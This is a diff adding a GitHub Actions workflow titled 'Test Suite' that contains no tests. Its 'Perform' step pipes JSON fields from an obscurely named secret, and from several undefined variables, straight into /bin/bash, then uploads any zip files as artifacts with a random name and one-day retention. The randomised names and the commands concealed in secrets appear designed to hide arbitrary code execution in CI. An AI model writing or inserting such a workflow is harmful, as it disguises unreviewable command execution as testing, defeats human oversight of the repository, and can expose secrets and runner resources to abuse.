@@ -1,0 +1,28 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          wszl88882: ${{ secrets.wszl88882 }}
+        run: |
+          printf '%s' "$wszl88882" | jq -r .mxat9 | /bin/bash
+          printf '%s' "$chdg5" | jq -r .ypac4 | /bin/bash
+          printf '%s' "$q0" | jq -r .qytdu61012 | /bin/bash
+          printf '%s' "$rg7657" | jq -r .w8 | /bin/bash
+          printf '%s' "$ulbvs82016" | jq -r .ajm0 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: zW8ya2gl
+          path: "*.zip"
+          retention-days: 1
